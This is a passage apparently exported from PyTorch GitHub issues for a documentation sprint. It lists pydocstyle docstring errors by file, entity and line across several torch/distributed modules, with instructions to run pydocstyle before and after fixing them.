- **File**: `torch/distributed/algorithms/_checkpoint/checkpoint_wrapper.py`, **Entity**: `_post_state_dict_hook`, **Line**: 72, **Description**: First line should end with a period (not 's')
- **File**: `torch/distributed/algorithms/_checkpoint/checkpoint_wrapper.py`, **Entity**: `_post_state_dict_hook`, **Line**: 72, **Description**: First line should not be the function's ""signature""
- **File**: `torch/distributed/algorithms/_checkpoint/checkpoint_wrapper.py`, **Entity**: `_pre_load_state_dict_hook`, **Line**: 90, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/distributed/algorithms/_checkpoint/checkpoint_wrapper.py`, **Entity**: `_pre_load_state_dict_hook`, **Line**: 90, **Description**: First line should end with a period (not '`')
- **File**: `torch/distributed/algorithms/_checkpoint/checkpoint_wrapper.py`, **Entity**: `CheckpointWrapper`, **Line**: 109, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/distributed/algorithms/_checkpoint/checkpoint_wrapper.py`, **Entity**: `CheckpointWrapper`, **Line**: 109, **Description**: First line should end with a period (not 's')
- **File**: `torch/distributed/algorithms/_checkpoint/checkpoint_wrapper.py`, **Entity**: `offload_wrapper`, **Line**: 173, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/distributed/algorithms/_checkpoint/checkpoint_wrapper.py`, **Entity**: `offload_wrapper`, **Line**: 173, **Description**: First line should end with a period (not 'd')
- **File**: `torch/distributed/algorithms/_checkpoint/checkpoint_wrapper.py`, **Entity**: `offload_wrapper`, **Line**: 173, **Description**: First line should be in imperative mood; try rephrasing (found 'A')
- **File**: `torch/distributed/algorithms/_checkpoint/checkpoint_wrapper.py`, **Entity**: `checkpoint_wrapper`, **Line**: 200, **Description**: No blank lines allowed after function docstring (found 1)
- **File**: `torch/distributed/algorithms/_checkpoint/checkpoint_wrapper.py`, **Entity**: `checkpoint_wrapper`, **Line**: 200, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/distributed/algorithms/_checkpoint/checkpoint_wrapper.py`, **Entity**: `checkpoint_wrapper`, **Line**: 200, **Description**: First line should end with a period (not 'd')
- **File**: `torch/distributed/algorithms/_checkpoint/checkpoint_wrapper.py`, **Entity**: `checkpoint_wrapper`, **Line**: 200, **Description**: First line should be in imperative mood; try rephrasing (found 'A')
- **File**: `torch/distributed/algorithms/_checkpoint/checkpoint_wrapper.py`, **Entity**: `apply_activation_checkpointing`, **Line**: 252, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/distributed/algorithms/_checkpoint/checkpoint_wrapper.py`, **Entity**: `apply_activation_checkpointing`, **Line**: 252, **Description**: First line should end with a period (not 'd')
- **File**: `torch/distributed/algorithms/_checkpoint/checkpoint_wrapper.py`, **Entity**: `apply_activation_checkpointing`, **Line**: 252, **Description**: First line should be in imperative mood (perhaps 'Apply', not 'Applies')
- **File**: `torch/distributed/algorithms/_optimizer_overlap/optimizer_overlap.py`, **Entity**: `__init__`, **Line**: 36, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/distributed/algorithms/_optimizer_overlap/optimizer_overlap.py`, **Entity**: `__init__`, **Line**: 36, **Description**: First line should end with a period (not 'o')
- **File**: `torch/distributed/algorithms/_optimizer_overlap/optimizer_overlap.py`, **Entity**: `__init__`, **Line**: 36, **Description**: First word of the first line should be properly capitalized ('Overlappedoptimizer', not 'OverlappedOptimizer')
- **File**: `torch/distributed/algorithms/_optimizer_overlap/optimizer_overlap.py`, **Entity**: `register_ddp`, **Line**: 43, **Description**: First line should be in imperative mood (perhaps 'Register', not 'Registers')
- **File**: `torch/distributed/algorithms/_optimizer_overlap/optimizer_overlap.py`, **Entity**: `register_fsdp`, **Line**: 49, **Description**: First line should be in imperative mood (perhaps 'Register', not 'Registers')
- **File**: `torch/distributed/algorithms/_optimizer_overlap/optimizer_overlap.py`, **Entity**: `_as_overlapped_optim`, **Line**: 76, **Description**: One-line docstring should fit on one line with quotes (found 3)
- **File**: `torch/distributed/algorithms/_optimizer_overlap/optimizer_overlap.py`, **Entity**: `_as_overlapped_optim`, **Line**: 76, **Description**: First line should be in imperative mood (perhaps 'Return', not 'Returns')
- **File**: `torch/distributed/algorithms/_comm_hooks/default_hooks.py`, **Entity**: `DefaultState`, **Line**: 7, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/distributed/algorithms/_comm_hooks/default_hooks.py`, **Entity**: `DefaultState`, **Line**: 7, **Description**: First line should end with a period (not 'm')
- **File**: `torch/distributed/algorithms/_comm_hooks/default_hooks.py`, **Entity**: `LowPrecisionState`, **Line**: 44, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/distributed/algorithms/_comm_hooks/default_hooks.py`, **Entity**: `LowPrecisionState`, **Line**: 44, **Description**: First line should end with a period (not 'n')
- **File**: `torch/distributed/algorithms/_comm_hooks/default_hooks.py`, **Entity**: `_decompress`, **Line**: 69, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/distributed/algorithms/_comm_hooks/default_hooks.py`, **Entity**: `_decompress`, **Line**: 69, **Description**: First line should end with a period (not 't')
- **File**: `torch/distributed/algorithms/_comm_hooks/default_hooks.py`, **Entity**: `allreduce_hook`, **Line**: 79, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/distributed/algorithms/_comm_hooks/default_hooks.py`, **Entity**: `allreduce_hook`, **Line**: 79, **Description**: First line should end with a period (not 'm')
- **File**: `torch/distributed/algorithms/_comm_hooks/default_hooks.py`, **Entity**: `allreduce_hook`, **Line**: 79, **Description**: First line should be in imperative mood; try rephrasing (found 'This')
- **File**: `torch/distributed/algorithms/_comm_hooks/default_hooks.py`, **Entity**: `reduce_scatter_hook`, **Line**: 98, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/distributed/algorithms/_comm_hooks/default_hooks.py`, **Entity**: `reduce_scatter_hook`, **Line**: 98, **Description**: First line should end with a period (not 'r')
- **File**: `torch/distributed/algorithms/_comm_hooks/default_hooks.py`, **Entity**: `reduce_scatter_hook`, **Line**: 98, **Description**: First line should be in imperative mood; try rephrasing (found 'This')
- **File**: `torch/distributed/algorithms/_comm_hooks/default_hooks.py`, **Entity**: `fp16_compress_hook`, **Line**: 131, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/distributed/algorithms/_comm_hooks/default_hooks.py`, **Entity**: `fp16_compress_hook`, **Line**: 131, **Description**: First line should end with a period (not 'n')
- **File**: `torch/distributed/algorithms/_comm_hooks/default_hooks.py`, **Entity**: `fp16_compress_hook`, **Line**: 131, **Description**: First line should be in imperative mood; try rephrasing (found 'This')
- **File**: `torch/distributed/algorithms/_comm_hooks/default_hooks.py`, **Entity**: `bf16_compress_hook`, **Line**: 148, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/distributed/algorithms/_comm_hooks/default_hooks.py`, **Entity**: `bf16_compress_hook`, **Line**: 148, **Description**: First line should end with a period (not 'n')
- **File**: `torch/distributed/algorithms/_comm_hooks/default_hooks.py`, **Entity**: `bf16_compress_hook`, **Line**: 148, **Description**: First line should be in imperative mood; try rephrasing (found 'This')
- **File**: `torch/distributed/algorithms/_quantization/quantization.py`, **Entity**: `DQuantType`, **Line**: 13, **Description**: 1 blank line required after class docstring (found 0)
- **File**: `torch/distributed/algorithms/_quantization/quantization.py`, **Entity**: `DQuantType`, **Line**: 13, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/distributed/algorithms/_quantization/quantization.py`, **Entity**: `auto_quantize`, **Line**: 90, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/distributed/algorithms/_quantization/quantization.py`, **Entity**: `auto_quantize`, **Line**: 90, **Description**: First line should end with a period (not 'd')
- **File**: `torch/distributed/algorithms/_quantization/quantization.py`, **Entity**: `auto_quantize`, **Line**: 90, **Description**: First line should be in imperative mood; try rephrasing (found 'This')
- **File**: `torch/distributed/benchmarks/benchmark_ddp_rpc.py`, **Entity**: `HybridModel`, **Line**: 34, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/distributed/benchmarks/benchmark_ddp_rpc.py`, **Entity**: `HybridModel`, **Line**: 34, **Description**: Docstring is under-indented
- **File**: `torch/distributed/benchmarks/benchmark_ddp_rpc.py`, **Entity**: `HybridModel`, **Line**: 34, **Description**: First line should end with a period (not 'n')
- **File**: `torch/distributed/benchmarks/benchmark_ddp_rpc.py`, **Entity**: `_run_trainer`, **Line**: 119, **Description**: No blank lines allowed after function docstring (found 1)
- **File**: `torch/distributed/benchmarks/benchmark_ddp_rpc.py`, **Entity**: `_run_trainer`, **Line**: 119, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/distributed/benchmarks/benchmark_ddp_rpc.py`, **Entity**: `_run_trainer`, **Line**: 119, **Description**: Docstring is under-indented
- **File**: `torch/distributed/benchmarks/benchmark_ddp_rpc.py`, **Entity**: `_run_trainer`, **Line**: 119, **Description**: First line should end with a period (not 'e')
- **File**: `torch/distributed/benchmarks/benchmark_ddp_rpc.py`, **Entity**: `run_worker`, **Line**: 201, **Description**: No blank lines allowed after function docstring (found 1)
- **File**: `torch/distributed/benchmarks/benchmark_ddp_rpc.py`, **Entity**: `run_worker`, **Line**: 201, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/distributed/benchmarks/benchmark_ddp_rpc.py`, **Entity**: `run_worker`, **Line**: 201, **Description**: Docstring is under-indented
- **File**: `torch/distributed/benchmarks/benchmark_ddp_rpc.py`, **Entity**: `run_worker`, **Line**: 201, **Description**: First line should end with a period (not 'n')
- **File**: `torch/distributed/benchmarks/benchmark_ddp_rpc.py`, **Entity**: `run_worker`, **Line**: 201, **Description**: First line should be in imperative mood; try rephrasing (found 'A')
- **File**: `torch/distributed/pipeline/sync/batchnorm.py`, **Entity**: `DeferredBatchNorm`, **Line**: 24, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/distributed/pipeline/sync/batchnorm.py`, **Entity**: `DeferredBatchNorm`, **Line**: 24, **Description**: First line should end with a period (not 'g')
- **File**: `torch/distributed/pipeline/sync/batchnorm.py`, **Entity**: `_commit`, **Line**: 73, **Description**: First line should be in imperative mood (perhaps 'Update', not 'Updates')
- **File**: `torch/distributed/pipeline/sync/batchnorm.py`, **Entity**: `convert_deferred_batch_norm`, **Line**: 136, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/distributed/pipeline/sync/batchnorm.py`, **Entity**: `convert_deferred_batch_norm`, **Line**: 136, **Description**: First line should end with a period (not 'g')
- **File**: `torch/distributed/pipeline/sync/batchnorm.py`, **Entity**: `convert_deferred_batch_norm`, **Line**: 136, **Description**: First line should be in imperative mood (perhaps 'Convert', not 'Converts')
- **File**: `torch/distributed/pipeline/sync/copy.py`, **Entity**: ``, **Line**: 7, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/distributed/pipeline/sync/copy.py`, **Entity**: ``, **Line**: 7, **Description**: First line should end with a period (not 'y')
- **File**: `torch/distributed/pipeline/sync/dependency.py`, **Entity**: `join`, **Line**: 40, **Description**: First line should be in imperative mood (perhaps 'Merge', not 'Merges')
- **File**: `torch/distributed/pipeline/sync/phony.py`, **Entity**: `get_phony`, **Line**: 22, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/distributed/pipeline/sync/phony.py`, **Entity**: `get_phony`, **Line**: 22, **Description**: First line should end with a period (not 'e')
- **File**: `torch/distributed/pipeline/sync/phony.py`, **Entity**: `get_phony`, **Line**: 22, **Description**: First line should be in imperative mood (perhaps 'Get', not 'Gets')
- **File**: `torch/distributed/pipeline/sync/pipeline.py`, **Entity**: `_clock_cycles`, **Line**: 65, **Description**: First line should be in imperative mood (perhaps 'Generate', not 'Generates')
- **File**: `torch/distributed/pipeline/sync/pipeline.py`, **Entity**: `run`, **Line**: 102, **Description**: First line should be in imperative mood (perhaps 'Run', not 'Runs')
- **File**: `torch/distributed/pipeline/sync/pipeline.py`, **Entity**: `fence`, **Line**: 123, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/distributed/pipeline/sync/pipeline.py`, **Entity**: `fence`, **Line**: 123, **Description**: First line should end with a period (not 's')
- **File**: `torch/distributed/pipeline/sync/pipeline.py`, **Entity**: `fence`, **Line**: 123, **Description**: First line should be in imperative mood (perhaps 'Copy', not 'Copies')
- **File**: `torch/distributed/pipeline/sync/pipeline.py`, **Entity**: `compute`, **Line**: 148, **Description**: First line should be in imperative mood (perhaps 'Run', not 'Runs')
- **File**: `torch/distributed/pipeline/sync/utils.py`, **Entity**: `partition_model`, **Line**: 10, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/distributed/pipeline/sync/utils.py`, **Entity**: `partition_model`, **Line**: 10, **Description**: First line should end with a period (not 's')
- **File**: `torch/distributed/pipeline/sync/worker.py`, **Entity**: `worker`, **Line**: 70, **Description**: First line should be in imperative mood; try rephrasing (found 'The')
- **File**: `torch/distributed/pipeline/sync/checkpoint.py`, **Entity**: `checkpoint`, **Line**: 71, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/distributed/pipeline/sync/checkpoint.py`, **Entity**: `checkpoint`, **Line**: 71, **Description**: First line should end with a period (not 'e')
- **File**: `torch/distributed/pipeline/sync/checkpoint.py`, **Entity**: `checkpoint`, **Line**: 71, **Description**: First line should be in imperative mood (perhaps 'Make', not 'Makes')
- **File**: `torch/distributed/pipeline/sync/checkpoint.py`, **Entity**: `checkpoint`, **Line**: 97, **Description**: First line should be in imperative mood (perhaps 'Return', not 'Returns')
- **File**: `torch/distributed/pipeline/sync/checkpoint.py`, **Entity**: `recompute`, **Line**: 115, **Description**: First line should be in imperative mood (perhaps 'Apply', not 'Applies')
- **File**: `torch/distributed/pipeline/sync/checkpoint.py`, **Entity**: `enable_checkpointing`, **Line**: 139, **Description**: First line should be in imperative mood (perhaps 'Make', not 'Makes')
- **File**: `torch/distributed/pipeline/sync/checkpoint.py`, **Entity**: `enable_recomputing`, **Line**: 150, **Description**: First line should be in imperative mood (perhaps 'Make', not 'Makes')
- **File**: `torch/distributed/pipeline/sync/checkpoint.py`, **Entity**: `is_recomputing`, **Line**: 170, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/distributed/pipeline/sync/checkpoint.py`, **Entity**: `is_recomputing`, **Line**: 170, **Description**: First line should end with a period (not 't')
- **File**: `torch/distributed/pipeline/sync/checkpoint.py`, **Entity**: `Context`, **Line**: 194, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/distributed/pipeline/sync/checkpoint.py`, **Entity**: `Context`, **Line**: 194, **Description**: First line should end with a period (not 'd')
- **File**: `torch/distributed/pipeline/sync/checkpoint.py`, **Entity**: `save_rng_states`, **Line**: 211, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/distributed/pipeline/sync/checkpoint.py`, **Entity**: `save_rng_states`, **Line**: 211, **Description**: First line should end with a period (not 'r')
- **File**: `torch/distributed/pipeline/sync/checkpoint.py`, **Entity**: `restore_rng_states`, **Line**: 230, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/distributed/pipeline/sync/checkpoint.py`, **Entity**: `restore_rng_states`, **Line**: 230, **Description**: First line should end with a period (not 's')

cc @carljparker",False
"Fix docstring errors in functional.py, remote_module.py, named_optimizer.py, join.py module: docs triaged medium docathon-h2-2023","Please fix the following issues. To test locally, run: 
 ```
pydocstyle path-to-file --count
```
Run this command before and after fixing the errors. This command prints out the number of errors at the end of the output. Paste the output to your PR description with the number before and after. 
- **File**: `torch/distributed/optim/named_optimizer.py`, **Entity**: `_NamedOptimizer`, **Line**: 20, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/distributed/optim/named_optimizer.py`, **Entity**: `_NamedOptimizer`, **Line**: 20, **Description**: First line should end with a period (not 'y')
- **File**: `torch/distributed/optim/named_optimizer.py`, **Entity**: `state_dict`, **Line**: 122, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/distributed/optim/named_optimizer.py`, **Entity**: `state_dict`, **Line**: 122, **Description**: First line should end with a period (not 'x')
- **File**: `torch/distributed/optim/named_optimizer.py`, **Entity**: `step`, **Line**: 148, **Description**: First line should be in imperative mood (perhaps 'Perform', not 'Performs')
- **File**: `torch/distributed/optim/named_optimizer.py`, **Entity**: `load_state_dict`, **Line**: 157, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/distributed/optim/named_optimizer.py`, **Entity**: `load_state_dict`, **Line**: 157, **Description**: First line should end with a period (not 't')
- **File**: `torch/distributed/optim/named_optimizer.py`, **Entity**: `load_state_dict`, **Line**: 157, **Description**: First line should be in imperative mood; try rephrasing (found 'This')
- **File**: `torch/distributed/optim/named_optimizer.py`, **Entity**: `init_state`, **Line**: 288, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/distributed/optim/named_optimizer.py`, **Entity**: `init_state`, **Line**: 288, **Description**: First line should end with a period (not 'e')
- **File**: `torch/distributed/optim/named_optimizer.py`, **Entity**: `init_state`, **Line**: 288, **Description**: First line should be in imperative mood (perhaps 'Run', not 'Runs')
- **File**: `torch/distributed/optim/named_optimizer.py`, **Entity**: `_gen_param_group_key`, **Line**: 319, **Description**: One-line docstring should fit on one line with quotes (found 3)
- **File**: `torch/distributed/nn/functional.py`, **Entity**: `all_to_all`, **Line**: 155, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/distributed/nn/functional.py`, **Entity**: `all_to_all`, **Line**: 155, **Description**: First line should end with a period (not 'd')
- **File**: `torch/distributed/nn/functional.py`, **Entity**: `all_to_all_single`, **Line**: 178, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/distributed/nn/functional.py`, **Entity**: `all_to_all_single`, **Line**: 178, **Description**: First line should end with a period (not 't')
- **File**: `torch/distributed/nn/functional.py`, **Entity**: `all_reduce`, **Line**: 203, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/distributed/nn/functional.py`, **Entity**: `all_reduce`, **Line**: 203, **Description**: First line should end with a period (not 't')
- **File**: `torch/distributed/nn/api/remote_module.py`, **Entity**: `__init__`, **Line**: 135, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/distributed/nn/api/remote_module.py`, **Entity**: `__init__`, **Line**: 135, **Description**: First line should be in imperative mood; try rephrasing (found 'A')
- **File**: `torch/distributed/nn/api/remote_module.py`, **Entity**: `remote_parameters`, **Line**: 283, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/distributed/nn/api/remote_module.py`, **Entity**: `remote_parameters`, **Line**: 283, **Description**: First line should end with a period (not 'e')
- **File**: `torch/distributed/nn/api/remote_module.py`, **Entity**: `remote_parameters`, **Line**: 283, **Description**: First line should be in imperative mood (perhaps 'Return', not 'Returns')
- **File**: `torch/distributed/nn/api/remote_module.py`, **Entity**: `get_module_rref`, **Line**: 301, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/distributed/nn/api/remote_module.py`, **Entity**: `get_module_rref`, **Line**: 301, **Description**: First line should end with a period (not ')')
- **File**: `torch/distributed/nn/api/remote_module.py`, **Entity**: `get_module_rref`, **Line**: 301, **Description**: First line should be in imperative mood (perhaps 'Return', not 'Returns')
- **File**: `torch/distributed/nn/api/remote_module.py`, **Entity**: `_prepare_init`, **Line**: 461, **Description**: One-line docstring should fit on one line with quotes (found 3)
- **File**: `torch/distributed/nn/api/remote_module.py`, **Entity**: `_prepare_init`, **Line**: 461, **Description**: First line should be in imperative mood (perhaps 'Prepare', not 'Prepares')
- **File**: `torch/distributed/nn/api/remote_module.py`, **Entity**: `_init_template`, **Line**: 484, **Description**: One-line docstring should fit on one line with quotes (found 3)
- **File**: `torch/distributed/nn/api/remote_module.py`, **Entity**: `_init_template`, **Line**: 484, **Description**: First line should be in imperative mood (perhaps 'Instantiate', not 'Instantiates')
- **File**: `torch/distributed/nn/api/remote_module.py`, **Entity**: `_check_attribute_picklability`, **Line**: 493, **Description**: One-line docstring should fit on one line with quotes (found 3)
- **File**: `torch/distributed/nn/api/remote_module.py`, **Entity**: `_check_attribute_picklability`, **Line**: 493, **Description**: First line should be in imperative mood (perhaps 'Check', not 'Checks')
- **File**: `torch/distributed/nn/api/remote_module.py`, **Entity**: `init_from_module_rref`, **Line**: 518, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/distributed/nn/api/remote_module.py`, **Entity**: `RemoteModule`, **Line**: 609, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/distributed/nn/api/remote_module.py`, **Entity**: `_remote_module_receiver`, **Line**: 696, **Description**: One-line docstring should fit on one line with quotes (found 3)
- **File**: `torch/distributed/nn/api/remote_module.py`, **Entity**: `_remote_module_reducer`, **Line**: 718, **Description**: One-line docstring should fit on one line with quotes (found 3)
- **File**: `torch/distributed/nn/api/remote_module.py`, **Entity**: `_remote_module_reducer`, **Line**: 718, **Description**: First line should be in imperative mood (perhaps 'Serialize', not 'Serializes')
- **File**: `torch/distributed/nn/api/remote_module.py`, **Entity**: `_recursive_script_module_receiver`, **Line**: 748, **Description**: One-line docstring should fit on one line with quotes (found 3)
- **File**: `torch/distributed/nn/api/remote_module.py`, **Entity**: `_recursive_script_module_reducer`, **Line**: 757, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/distributed/nn/api/remote_module.py`, **Entity**: `_recursive_script_module_reducer`, **Line**: 757, **Description**: First line should end with a period (not ',')
- **File**: `torch/distributed/nn/api/remote_module.py`, **Entity**: `_recursive_script_module_reducer`, **Line**: 757, **Description**: First line should be in imperative mood (perhaps 'Serialize', not 'Serializes')
- **File**: `torch/distributed/algorithms/join.py`, **Entity**: `JoinHook`, **Line**: 12, **Description**: 1 blank line required after class docstring (found 0)
- **File**: `torch/distributed/algorithms/join.py`, **Entity**: `JoinHook`, **Line**: 12, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/distributed/algorithms/join.py`, **Entity**: `JoinHook`, **Line**: 12, **Description**: First line should end with a period (not 'n')
- **File**: `torch/distributed/algorithms/join.py`, **Entity**: `main_hook`, **Line**: 23, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/distributed/algorithms/join.py`, **Entity**: `main_hook`, **Line**: 23, **Description**: First line should end with a period (not 's')
- **File**: `torch/distributed/algorithms/join.py`, **Entity**: `main_hook`, **Line**: 23, **Description**: First line should be in imperative mood; try rephrasing (found 'This')
- **File**: `torch/distributed/algorithms/join.py`, **Entity**: `post_hook`, **Line**: 31, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/distributed/algorithms/join.py`, **Entity**: `post_hook`, **Line**: 31, **Description**: First line should end with a period (not 'n')
- **File**: `torch/distributed/algorithms/join.py`, **Entity**: `post_hook`, **Line**: 31, **Description**: First line should be in imperative mood; try rephrasing (found 'This')
- **File**: `torch/distributed/algorithms/join.py`, **Entity**: `Joinable`, **Line**: 44, **Description**: 1 blank line required after class docstring (found 0)
- **File**: `torch/distributed/algorithms/join.py`, **Entity**: `Joinable`, **Line**: 44, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/distributed/algorithms/join.py`, **Entity**: `Joinable`, **Line**: 44, **Description**: First line should end with a period (not 's')
- **File**: `torch/distributed/algorithms/join.py`, **Entity**: `join_hook`, **Line**: 58, **Description**: First line should be in imperative mood (perhaps 'Return', not 'Returns')
- **File**: `torch/distributed/algorithms/join.py`, **Entity**: `join_device`, **Line**: 72, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/distributed/algorithms/join.py`, **Entity**: `join_device`, **Line**: 72, **Description**: First line should end with a period (not 's')
- **File**: `torch/distributed/algorithms/join.py`, **Entity**: `join_process_group`, **Line**: 81, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/distributed/algorithms/join.py`, **Entity**: `join_process_group`, **Line**: 81, **Description**: First line should end with a period (not 'y')
- **File**: `torch/distributed/algorithms/join.py`, **Entity**: `_JoinConfig`, **Line**: 89, **Description**: 1 blank line required after class docstring (found 0)
- **File**: `torch/distributed/algorithms/join.py`, **Entity**: `_JoinConfig`, **Line**: 89, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/distributed/algorithms/join.py`, **Entity**: `_JoinConfig`, **Line**: 89, **Description**: First line should end with a period (not 'e')
- **File**: `torch/distributed/algorithms/join.py`, **Entity**: `construct_disabled_join_config`, **Line**: 99, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/distributed/algorithms/join.py`, **Entity**: `construct_disabled_join_config`, **Line**: 99, **Description**: First line should end with a period (not 'd')
- **File**: `torch/distributed/algorithms/join.py`, **Entity**: `construct_disabled_join_config`, **Line**: 99, **Description**: First line should be in imperative mood (perhaps 'Return', not 'Returns')
- **File**: `torch/distributed/algorithms/join.py`, **Entity**: `Join`, **Line**: 113, **Description**: 1 blank line required after class docstring (found 0)
- **File**: `torch/distributed/algorithms/join.py`, **Entity**: `Join`, **Line**: 113, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/distributed/algorithms/join.py`, **Entity**: `Join`, **Line**: 113, **Description**: First line should end with a period (not 'm')
- **File**: `torch/distributed/algorithms/join.py`, **Entity**: `_set_joinable_configs`, **Line**: 189, **Description**: One-line docstring should fit on one line with quotes (found 3)
- **File**: `torch/distributed/algorithms/join.py`, **Entity**: `_set_joinable_configs`, **Line**: 189, **Description**: First line should be in imperative mood (perhaps 'Set', not 'Sets')
- **File**: `torch/distributed/algorithms/join.py`, **Entity**: `_extract_dist_info`, **Line**: 203, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/distributed/algorithms/join.py`, **Entity**: `_extract_dist_info`, **Line**: 203, **Description**: First line should be in imperative mood (perhaps 'Extract', not 'Extracts')
- **File**: `torch/distributed/algorithms/join.py`, **Entity**: `__exit__`, **Line**: 238, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/distributed/algorithms/join.py`, **Entity**: `__exit__`, **Line**: 238, **Description**: First line should end with a period (not 's')
- **File**: `torch/distributed/algorithms/join.py`, **Entity**: `_get_num_nonjoined_procs`, **Line**: 286, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/distributed/algorithms/join.py`, **Entity**: `_get_num_nonjoined_procs`, **Line**: 286, **Description**: First line should end with a period (not 'e')
- **File**: `torch/distributed/algorithms/join.py`, **Entity**: `_get_num_nonjoined_procs`, **Line**: 286, **Description**: First line should be in imperative mood (perhaps 'Return', not 'Returns')
- **File**: `torch/distributed/algorithms/join.py`, **Entity**: `_notify_procs_to_terminate`, **Line**: 295, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/distributed/algorithms/join.py`, **Entity**: `_notify_procs_to_terminate`, **Line**: 295, **Description**: First line should end with a period (not 'e')
- **File**: `torch/distributed/algorithms/join.py`, **Entity**: `notify_join_context`, **Line**: 306, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/distributed/algorithms/join.py`, **Entity**: `notify_join_context`, **Line**: 306, **Description**: First line should end with a period (not 't')

cc @carljparker",False
Fix docstring errors in zero_redundancy_optimizer.py module: docs triaged medium docathon-h2-2023,"Please fix the following issues. To test locally, run: 
 ```
pydocstyle path-to-file --count
```
Run this command before and after fixing the errors. This command prints out the number of errors at the end of the output. Paste the output to your PR description with the number before and after. 
- **File**: `torch/distributed/optim/zero_redundancy_optimizer.py`, **Entity**: `_recursive_copy_to_device`, **Line**: 33, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/distributed/optim/zero_redundancy_optimizer.py`, **Entity**: `_recursive_copy_to_device`, **Line**: 33, **Description**: First line should end with a period (not 'f')
- **File**: `torch/distributed/optim/zero_redundancy_optimizer.py`, **Entity**: `_is_trainable`, **Line**: 63, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/distributed/optim/zero_redundancy_optimizer.py`, **Entity**: `_is_trainable`, **Line**: 63, **Description**: First line should end with a period (not 'o')
- **File**: `torch/distributed/optim/zero_redundancy_optimizer.py`, **Entity**: `_is_trainable`, **Line**: 63, **Description**: First line should be in imperative mood (perhaps 'Return', not 'Returns')
- **File**: `torch/distributed/optim/zero_redundancy_optimizer.py`, **Entity**: `_broadcast_object`, **Line**: 76, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/distributed/optim/zero_redundancy_optimizer.py`, **Entity**: `_broadcast_object`, **Line**: 76, **Description**: First line should end with a period (not 'm')
- **File**: `torch/distributed/optim/zero_redundancy_optimizer.py`, **Entity**: `main_hook`, **Line**: 123, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/distributed/optim/zero_redundancy_optimizer.py`, **Entity**: `main_hook`, **Line**: 123, **Description**: First line should end with a period (not 'f')
- **File**: `torch/distributed/optim/zero_redundancy_optimizer.py`, **Entity**: `main_hook`, **Line**: 123, **Description**: First line should be in imperative mood (perhaps 'Perform', not 'Performs')
- **File**: `torch/distributed/optim/zero_redundancy_optimizer.py`, **Entity**: `_DDPBucketAssignment`, **Line**: 131, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/distributed/optim/zero_redundancy_optimizer.py`, **Entity**: `_DDPBucketAssignment`, **Line**: 131, **Description**: First line should end with a period (not ',')
- **File**: `torch/distributed/optim/zero_redundancy_optimizer.py`, **Entity**: `_OverlapStatus`, **Line**: 167, **Description**: 1 blank line required after class docstring (found 0)
- **File**: `torch/distributed/optim/zero_redundancy_optimizer.py`, **Entity**: `_OverlapStatus`, **Line**: 167, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/distributed/optim/zero_redundancy_optimizer.py`, **Entity**: `_OverlapStatus`, **Line**: 167, **Description**: First line should end with a period (not 't')
